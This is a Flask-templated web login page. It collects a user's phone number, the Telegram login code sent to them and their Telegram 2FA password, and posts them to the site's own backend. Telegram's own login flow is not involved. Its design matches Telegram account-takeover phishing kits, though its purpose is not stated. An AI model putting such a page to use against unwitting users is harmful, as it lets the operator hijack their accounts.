<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Login</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
:root{
  --glass:rgba(255,255,255,.07);
  --glass-2:rgba(255,255,255,.14);
  --line:rgba(255,255,255,.22);
  --line-2:rgba(255,255,255,.60);
  --r:24px;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0}
body{
  position:relative;min-height:100svh;
  display:flex;align-items:center;justify-content:center;
  padding:24px 18px;background:#000;color:#fff;
  font-family:Inter,system-ui,-apple-system,sans-serif;
  overflow-x:hidden;-webkit-font-smoothing:antialiased;
  transition:opacity .45s ease;
}
body.out{opacity:0}

/* ============ BACKGROUND VIDEO (full screen) ============ */
.bg{position:absolute;inset:0;z-index:0;overflow:hidden;background:#000}
.bg video{
  position:absolute;inset:0;width:100%;height:100%;
  object-fit:cover;object-position:center center;display:block;
}
.scrim{position:absolute;inset:0;background:rgba(0,0,0,.16)}
.bg.no-video video{display:none}

/* ============ SOUND TOGGLE ============ */
.sound{
  position:absolute;top:18px;right:18px;z-index:5;
  width:38px;height:38px;border-radius:50%;cursor:pointer;
  display:grid;place-items:center;color:#fff;
  background:rgba(255,255,255,.08);border:1px solid var(--line);
  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
  transition:.25s;
}
.sound:hover{background:rgba(255,255,255,.18)}
.sound .slash{opacity:0;transition:.2s}
.sound.muted .waves{opacity:0}
.sound.muted .slash{opacity:1}

/* ============ TRANSPARENT CARD ============ */
.card{
  position:relative;z-index:2;width:100%;max-width:378px;
  padding:20px;border-radius:var(--r);
  background:rgba(255,255,255,.055);
  backdrop-filter:blur(14px) saturate(135%);
  -webkit-backdrop-filter:blur(14px) saturate(135%);
  border:1px solid var(--line);
  box-shadow:0 26px 60px -26px rgba(0,0,0,.65), 0 1px 0 rgba(255,255,255,.28) inset;
  transition:opacity .4s ease, transform .4s ease;
  animation:in .7s cubic-bezier(.2,.9,.25,1) both;
}
@keyframes in{from{opacity:0;transform:translateY(18px) scale(.99)}to{opacity:1;transform:none}}
body.out .card{opacity:0;transform:scale(.97)}

/* ============ BACK ============ */
.back{
  position:absolute;top:13px;left:13px;z-index:3;
  width:30px;height:30px;border-radius:50%;cursor:pointer;
  display:none;place-items:center;color:#fff;
  background:rgba(255,255,255,.08);border:1px solid var(--line);
  transition:.2s;
}
.back:hover{background:rgba(255,255,255,.2)}
.card[data-step="2"] .back{display:grid}

/* ============ STEPS ============ */
.step{display:none}
.step.is-active{display:block;animation:rise .45s cubic-bezier(.2,.9,.25,1)}
@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
.step[data-step="2"].is-active{padding-top:30px}

/* ============ ROW ============ */
.row{
  display:flex;align-items:center;gap:8px;
  background:var(--glass);border:1px solid var(--line);
  border-radius:16px;padding:0 6px 0 15px;transition:.22s;
}
.row:focus-within{border-color:var(--line-2);background:var(--glass-2)}
.row input{
  flex:1;min-width:0;width:100%;background:none;border:0;outline:0;
  color:#fff;font-family:inherit;font-size:15px;letter-spacing:.3px;
  padding:16px 0;
}
.row input::placeholder{color:rgba(255,255,255,.5)}
.row input:disabled{opacity:.55}
.row .prefix{font-size:15px;color:rgba(255,255,255,.65);padding-right:2px}

.go{
  flex:none;width:42px;height:42px;border-radius:13px;border:0;cursor:pointer;
  display:grid;place-items:center;
  background:rgba(255,255,255,.92);color:#0a0a0a;transition:.2s;
}
.go:hover:not([disabled]){background:#fff;transform:translateX(2px)}
.go[disabled]{opacity:.6;cursor:default;transform:none}
.sp{
  display:block;width:14px;height:14px;border-radius:50%;
  border:2px solid rgba(0,0,0,.22);border-top-color:#0a0a0a;
  animation:spin .7s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ============ OTP ============ */
.otp{display:flex;gap:8px}
.otp input{
  flex:1;min-width:0;height:56px;text-align:center;
  font-family:inherit;font-size:20px;font-weight:500;
  color:#fff;background:var(--glass);
  border:1px solid var(--line);border-radius:14px;outline:0;
  transition:.2s;padding:0;
}
.otp input:focus{border-color:var(--line-2);background:var(--glass-2);transform:translateY(-2px)}
.otp input.filled{border-color:rgba(255,255,255,.45);background:rgba(255,255,255,.16)}
.otp input:disabled{opacity:.55}

/* ============ PASSWORD (only when 2FA) ============ */
#pwRow{margin-top:12px}
.hidden{display:none !important}
.reveal{animation:rise .45s cubic-bezier(.2,.9,.25,1)}

/* ============ MESSAGE ============ */
.msg{
  margin:12px 2px 0;min-height:15px;text-align:center;
  font-size:12px;font-weight:400;letter-spacing:.2px;
  color:rgba(255,255,255,.68);
  text-shadow:0 1px 10px rgba(0,0,0,.7);
  transition:color .2s;
}
.msg.strong{color:#fff}
.msg.strong::before{
  content:"";display:inline-block;width:5px;height:5px;border-radius:50%;
  background:#fff;vertical-align:middle;margin-right:7px;margin-top:-2px;
}
.step[data-step="1"] .msg{text-align:left;margin-left:4px}
@keyframes shake{
  10%,90%{transform:translateX(-1px)}
  20%,80%{transform:translateX(2px)}
  30%,50%,70%{transform:translateX(-3px)}
  40%,60%{transform:translateX(3px)}
}
.msg.shake{animation:shake .4s}

@media(max-width:400px){
  .card{max-width:100%;padding:16px}
  .otp{gap:6px}
  .otp input{height:52px;font-size:18px;border-radius:12px}
  .step[data-step="2"].is-active{padding-top:28px}
}
</style>
</head>
<body>

<!-- =========================================================
     VIDEO  ->  {{ bg_video }} config se aata hai.
     Error hone par niche wala fallback use ho jaata hai.
     ========================================================= -->
<div class="bg" id="bg">
  <video id="bgVideo" autoplay muted loop playsinline preload="auto"
         src="{{ bg_video or '' }}"
         data-fallback="https://files.catbox.moe/zp6wxp.mp4"></video>
  <div class="scrim"></div>
</div>

<button class="sound muted" id="soundBtn" aria-label="Toggle sound">
  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor"
       stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
    <path d="M11 5 6 9H3v6h3l5 4V5z"/>
    <path class="waves" d="M15.6 8.6a4.8 4.8 0 0 1 0 6.8M18.6 5.6a9 9 0 0 1 0 12.8"/>
    <path class="slash" d="M3.5 20.5 20.5 3.5"/>
  </svg>
</button>

<main class="card" id="card" data-step="1">

  <button class="back" id="backBtn" aria-label="Back" type="button">
    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 6l-6 6 6 6"/>
    </svg>
  </button>

  <!-- STEP 1 : PHONE -->
  <section class="step is-active" data-step="1">
    <div class="row">
      <span class="prefix">+</span>
      <input id="phone" type="tel" inputmode="tel" autocomplete="tel"
             pattern="[0-9 ]*" placeholder="Country code and number">
      <button class="go" id="sendBtn" aria-label="Send code" type="button">
        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h13M13 6l6 6-6 6"/>
        </svg>
      </button>
    </div>
    <p class="msg" id="msg1" aria-live="polite"></p>
  </section>

  <!-- STEP 2 : OTP ( + 2FA only if backend asks ) -->
  <section class="step" data-step="2">
    <div class="otp" id="otpWrap">
      <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
    </div>

    <div class="row hidden" id="pwRow">
      <input type="password" id="password" placeholder="2FA password" autocomplete="off">
      <button class="go" id="pwBtn" aria-label="Submit" type="button">
        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h13M13 6l6 6-6 6"/>
        </svg>
      </button>
    </div>

    <p class="msg" id="msg2" aria-live="polite"></p>
  </section>

</main>

<script>
/* =========================================================
   CONFIG
   ========================================================= */
const DASHBOARD_URL = "/dashboard";   // Flask route
const OTP_LENGTH    = 5;              // Telegram default
const STORE_KEY     = "nexa_sid";

/* ================= background video ================= */
const bgVideo  = document.getElementById("bgVideo");
const bgWrap   = document.getElementById("bg");
const soundBtn = document.getElementById("soundBtn");
let usedFallback = false;

function loadVideo(){
  const src = bgVideo.getAttribute("src");
  if(!src){ bgVideo.src = bgVideo.dataset.fallback; }
  bgVideo.play().catch(() => { bgVideo.muted = true; bgVideo.play().catch(()=>{}); });
}
bgVideo.addEventListener("error", () => {
  if(!usedFallback && bgVideo.dataset.fallback){
    usedFallback = true;
    bgVideo.src = bgVideo.dataset.fallback;
    loadVideo();
  } else {
    bgWrap.classList.add("no-video");
  }
}, true);
loadVideo();
document.addEventListener("click", () => bgVideo.play().catch(()=>{}), { once:true });

soundBtn.addEventListener("click", () => {
  bgVideo.muted = !bgVideo.muted;
  soundBtn.classList.toggle("muted", bgVideo.muted);
  if(!bgVideo.muted) bgVideo.play().catch(()=>{});
});

/* ================= helpers ================= */
const card    = document.getElementById("card");
const msg1    = document.getElementById("msg1");
const msg2    = document.getElementById("msg2");
const sendBtn = document.getElementById("sendBtn");
const pwBtn   = document.getElementById("pwBtn");
const pwRow   = document.getElementById("pwRow");
const pw      = document.getElementById("password");
const phone   = document.getElementById("phone");
const otpInputs = [...document.querySelectorAll(".otp-input")];

const state = {
  sessionId: null,
  needsPassword: false,
  verifying: false,
  forceNext: false,
};

function setMsg(el, text, strong){
  el.textContent = text || "";
  el.classList.toggle("strong", !!strong);
  el.classList.remove("shake");
  if(text && strong){ void el.offsetWidth; el.classList.add("shake"); }
}

function showStep(step){
  card.dataset.step = step;
  document.querySelectorAll(".step").forEach(s =>
    s.classList.toggle("is-active", s.dataset.step === String(step))
  );
  const target = state.needsPassword ? pw
    : document.querySelector('.step.is-active input:not([type="password"])');
  if(target && !target.disabled) setTimeout(() => target.focus(), 220);
}

function busy(btn, on){
  if(on){
    btn.dataset.html = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<span class="sp"></span>';
  } else {
    btn.disabled = false;
    if(btn.dataset.html) btn.innerHTML = btn.dataset.html;
  }
}

function lockOtp(lock){
  otpInputs.forEach(i => { i.disabled = lock; });
}

function clearOtp(){
  otpInputs.forEach(i => { i.value = ""; i.classList.remove("filled"); });
}

function saveSession(id){
  state.sessionId = id;
  try{
    if(id){ sessionStorage.setItem(STORE_KEY, id); } else { sessionStorage.removeItem(STORE_KEY); }
  }catch(_){}
  try{
    const url = new URL(location.href);
    if(id){ url.searchParams.set("s", id); } else { url.searchParams.delete("s"); }
    history.replaceState(null, "", url);
  }catch(_){}
}

async function api(path, body){
  const res = await fetch(path, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    credentials: "same-origin",
    body: JSON.stringify(body || {}),
  });
  let data = {};
  try { data = await res.json(); } catch(_){}
  return { status: res.status, data };
}

function goDashboard(){
  try{ sessionStorage.removeItem(STORE_KEY); }catch(_){}
  document.body.classList.add("out");
  setTimeout(() => { window.location.href = DASHBOARD_URL; }, 420);
}

/* ================= step 1 : send code ================= */
async function sendCode(){
  const digits = phone.value.replace(/\D/g,"");
  if(digits.length < 8){
    setMsg(msg1, "Enter a valid number with country code", true);
    phone.focus();
    return;
  }
  if(sendBtn.disabled) return;

  setMsg(msg1, "");
  busy(sendBtn, true);

  let res;
  try{
    res = await api("/api/send-code", {
      phone: digits,
      force: state.forceNext,
    });
  }catch(err){
    busy(sendBtn, false);
    setMsg(msg1, "Server unreachable. Try again.", true);
    return;
  }
  state.forceNext = false;
  busy(sendBtn, false);

  const d = res.data || {};

  if(res.status === 200 && d.ok){
    saveSession(d.session_id);
    state.needsPassword = false;
    pwRow.classList.add("hidden");
    clearOtp();
    showStep(2);
    setMsg(msg2, d.reused ? "Code already sent to your Telegram"
                          : "Code sent to your Telegram");
    setTimeout(() => otpInputs[0].focus(), 240);
    return;
  }

  setMsg(msg1, d.error || "Failed to send code. Try again.", true);
  if(res.status === 429 || res.status === 503) phone.focus();
}

sendBtn.addEventListener("click", sendCode);
phone.addEventListener("keydown", e => { if(e.key === "Enter") sendCode(); });
phone.addEventListener("input", () => {
  const clean = phone.value.replace(/\D/g,"").slice(0, 15);
  if(phone.value !== clean) phone.value = clean;
});

/* ================= OTP behaviour ================= */
otpInputs.forEach((inp, i) => {
  inp.addEventListener("input", () => {
    inp.value = inp.value.replace(/\D/g,"").slice(0,1);
    inp.classList.toggle("filled", !!inp.value);
    if(inp.value && i < otpInputs.length - 1) otpInputs[i+1].focus();
    if(!state.needsPassword && otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
  });

  inp.addEventListener("keydown", e => {
    if(e.key === "Backspace" && !inp.value && i > 0){
      e.preventDefault();
      otpInputs[i-1].value = "";
      otpInputs[i-1].classList.remove("filled");
      otpInputs[i-1].focus();
    }
    if(e.key === "ArrowLeft"  && i > 0) otpInputs[i-1].focus();
    if(e.key === "ArrowRight" && i < otpInputs.length - 1) otpInputs[i+1].focus();
    if(e.key === "Enter" && !state.needsPassword) verifyOtp();
  });

  inp.addEventListener("paste", e => {
    e.preventDefault();
    const d = (e.clipboardData.getData("text") || "").replace(/\D/g,"").split("");
    d.forEach((c, k) => {
      if(otpInputs[i+k]){ otpInputs[i+k].value = c; otpInputs[i+k].classList.add("filled"); }
    });
    otpInputs[Math.min(i + d.length, otpInputs.length - 1)].focus();
    if(!state.needsPassword && otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
  });
});

/* ================= step 2 : verify ================= */
async function verifyOtp(){
  if(state.verifying) return;
  if(!state.sessionId){ backToStart("Session expired. Enter your number again."); return; }

  const code = otpInputs.map(i => i.value).join("");
  if(!state.needsPassword && code.length < OTP_LENGTH) return;

  state.verifying = true;
  lockOtp(true);
  setMsg(msg2, "Verifying...");

  let res;
  try{
    res = await api("/api/verify-code", {
      session_id: state.sessionId,
      code: code,
      password: "",
    });
  }catch(err){
    state.verifying = false;
    lockOtp(false);
    setMsg(msg2, "Server unreachable. Try again.", true);
    return;
  }
  state.verifying = false;
  lockOtp(false);

  const d = res.data || {};

  /* 2FA required */
  if(d.requires_password){
    state.needsPassword = true;
    pwRow.classList.remove("hidden");
    pwRow.classList.add("reveal");
    setMsg(msg2, "Enter your 2FA password");
    setTimeout(() => pw.focus(), 200);
    return;
  }

  /* session dead -> restart */
  if(d.expired){
    backToStart(d.error || "Code expired. Request a new code.");
    return;
  }

  if(res.status === 200 && d.ok){ finish(); return; }

  /* wrong code / attempts left */
  setMsg(msg2, d.error || "Verification failed. Try again.", true);
  if(d.attempts_left){
    const empty = otpInputs.find(i => !i.value) || otpInputs[0];
    empty.focus();
  }
}

async function submitPassword(){
  if(state.verifying) return;
  if(!pw.value.trim()){ setMsg(msg2, "Enter your 2FA password", true); pw.focus(); return; }
  if(!state.sessionId){ backToStart("Session expired. Enter your number again."); return; }

  state.verifying = true;
  busy(pwBtn, true);
  pw.disabled = true;
  setMsg(msg2, "Verifying...");

  let res;
  try{
    res = await api("/api/verify-code", {
      session_id: state.sessionId,
      code: otpInputs.map(i => i.value).join(""),
      password: pw.value,
    });
  }catch(err){
    state.verifying = false;
    busy(pwBtn, false);
    pw.disabled = false;
    setMsg(msg2, "Server unreachable. Try again.", true);
    return;
  }
  state.verifying = false;
  busy(pwBtn, false);
  pw.disabled = false;

  const d = res.data || {};

  if(d.expired){ backToStart(d.error || "Code expired. Request a new code."); return; }

  if(res.status === 200 && d.ok){ finish(); return; }

  if(d.requires_password){
    setMsg(msg2, d.error || "Invalid 2FA password", true);
    pw.select();
    return;
  }
  setMsg(msg2, d.error || "Verification failed. Try again.", true);
}

function finish(){
  setMsg(msg2, "Success");
  lockOtp(true);
  setTimeout(goDashboard, 480);
}

pwBtn.addEventListener("click", submitPassword);
pw.addEventListener("keydown", e => { if(e.key === "Enter") submitPassword(); });

/* ================= back / reset ================= */
function backToStart(message){
  clearOtp();
  pw.value = "";
  pwRow.classList.add("hidden");
  state.needsPassword = false;
  state.verifying = false;
  state.forceNext = true;      // retry par naya code bhejna hai
  saveSession(null);
  setMsg(msg2, "");
  setMsg(msg1, message || "", !!message);
  showStep(1);
  setTimeout(() => phone.focus(), 240);
}

document.getElementById("backBtn").addEventListener("click", () => backToStart(""));

/* ================= bootstrap ================= */
(async function bootstrap(){
  /* 1) bot flow: /login?s=SESSION_ID */
  let sid = null;
  try{ sid = new URLSearchParams(location.search).get("s"); }catch(_){}
  if(!sid){ try{ sid = sessionStorage.getItem(STORE_KEY); }catch(_){} }

  if(!sid) return;

  try{
    const res = await fetch("/api/session-info?s=" + encodeURIComponent(sid),
                            { credentials: "same-origin" });
    const d = await res.json().catch(() => ({}));

    if(!res.ok || !d.ok){ saveSession(null); return; }

    saveSession(sid);
    state.needsPassword = !!d.requires_password;
    showStep(2);

    if(state.needsPassword){
      pwRow.classList.remove("hidden");
      setMsg(msg2, "Enter your 2FA password");
      setTimeout(() => pw.focus(), 260);
    } else {
      setMsg(msg2, d.masked ? ("Code sent to " + d.masked) : "Code sent to your Telegram");
      setTimeout(() => otpInputs[0].focus(), 260);
    }
  }catch(_){
    /* backend down -> step 1 par hi raho */
  }
})();
</script>
</body>
</html>
